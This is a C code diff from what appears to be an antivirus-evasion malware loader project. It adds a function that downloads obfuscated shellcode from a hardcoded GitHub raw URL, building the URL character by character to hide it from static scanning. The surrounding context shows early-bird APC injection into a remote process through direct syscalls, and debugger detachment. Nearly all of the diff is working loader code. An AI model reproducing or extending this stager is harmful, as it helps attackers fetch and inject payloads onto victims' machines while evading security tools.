@@ -43,6 +43,94 @@ BOOL LoadPayloadFromResource(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSi
 	return TRUE;
 }
 
+// TODO: API hashing
+BOOL LoadPayloadFromInternet(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSize) {
+
+	HANDLE		hInternet = NULL, hInternetFile = NULL;
+	PBYTE		pBytes = NULL;
+	PBYTE		pTmpBytes = NULL;
+	DWORD		dwBytesRead = NULL;
+	SIZE_T		sSize = NULL; // Used as the total payload size
+
+	// Manually constructing the string to avoid direct memory reference in .data section
+	// The original string is "https://raw.githubusercontent.com/aleister1102/BypassingAVs/master/BypassingAVs/shellcode.obfuscated.bin"
+	WCHAR url[] = {
+	L'h', L't', L't', L'p', L's', L':', L'/', L'/',
+	L'r', L'a', L'w', L'.', L'g', L'i', L't', L'h', L'u', L'b', L'u', L's', L'e', L'r', L'c', L'o', L'n', L't', L'e', L'n', L't', L'.', L'c', L'o', L'm', L'/',
+	L'a', L'l', L'e', L'i', L's', L't', L'e', L'r', L'1', L'1', L'0', L'2', L'/',
+	L'B', L'y', L'p', L'a', L's', L's', L'i', L'n', L'g', L'A', L'V', L's', L'/',
+	L'm', L'a', L's', L't', L'e', L'r', L'/',
+	L'B', L'y', L'p', L'a', L's', L's', L'i', L'n', L'g', L'A', L'V', L's', L'/',
+	L's', L'h', L'e', L'l', L'l', L'c', L'o', L'd', L'e', L'.', L'o', L'b', L'f', L'u', L's', L'c', L'a', L't', L'e', L'd', L'.', L'b', L'i', L'n', L'\0'
+	};
+
+	// Opening an internet session handle
+	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
+
+	// Opening a handle to the payload's URL
+	hInternetFile = InternetOpenUrlW(
+		hInternet,
+		url,
+		NULL,
+		NULL,
+		INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID,
+		NULL
+	);
+
+	// Dynamic memory allocation for the payload
+	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
+	if (pTmpBytes == NULL) {
+		goto _EndOfFunction;
+	}
+
+	while (TRUE) {
+		// Reading the payload from the URL to the temporary buffer
+		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
+			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
+			return FALSE;
+		}
+
+		// Summing the bytes read to the total size
+		sSize += dwBytesRead;
+
+		// In case the total buffer is not allocated yet
+		// then allocate it equal to the size of the bytes read since it may be less than 1024 bytes
+		if (pBytes == NULL)
+			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
+		else
+			// Otherwise, reallocate the pBytes to equal to the total size, sSize.
+			// This is required in order to fit the whole payload
+			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
+
+		// In case of memory allocation failure
+		if (pBytes == NULL) {
+			goto _EndOfFunction;
+		}
+
+		// Copy the bytes read from the temporary buffer to the main buffer
+		CopyMemoryEx((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
+
+		// Zeroing the temporary buffer
+		ZeroMemoryEx(pTmpBytes, dwBytesRead);
+
+		// If the bytes read are less than 1024, then break the loop as we reached the end of the payload
+		if (dwBytesRead < 1024) {
+			break;
+		}
+	}
+
+	PrintHexData("InternetPayload", pBytes, sSize);
+	return TRUE;
+
+_EndOfFunction:
+	InternetCloseHandle(hInternetFile);
+	InternetCloseHandle(hInternet);
+	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
+	LocalFree(pTmpBytes);
+	LocalFree(pBytes);
+	return FALSE;
+}
+
 BOOL IsProcessElevated(HANDLE hProcess) {
 	NTSTATUS		status = 0;
 	HANDLE			hToken = NULL;
@@ -504,8 +592,8 @@ BOOL RemoteEarlyBirdApcInjectionViaSyscalls(HANDLE hParentProcess, LPCSTR pstrSa
 	// Detach the debugger
 	WhisperHell(g_SyscallsTable.NtRemoveProcessDebug.wSystemCall);
 	if ((status = NtRemoveProcessDebug(
-		hProcess, 
-		hDebugObject)) 
+		hProcess,
+		hDebugObject))
 		!= 0x0) {
 		PRINTA("[!] NtRemoveProcessDebug Failed With Error : %d \n", GetLastError());
 		return FALSE;
@@ -525,8 +613,8 @@ BOOL RemoteEarlyBirdApcInjectionViaSyscalls(HANDLE hParentProcess, LPCSTR pstrSa
 	//! So we will ignore the return value
 	WhisperHell(g_SyscallsTable.NtFreeVirtualMemory.wSystemCall);
 	if ((status = NtFreeVirtualMemory(
-		hProcess, 
-		&pInjectedAddress, 
+		hProcess,
+		&pInjectedAddress,
 		&sInjectedSize,
 		MEM_RELEASE))
 		!= 0x0) {
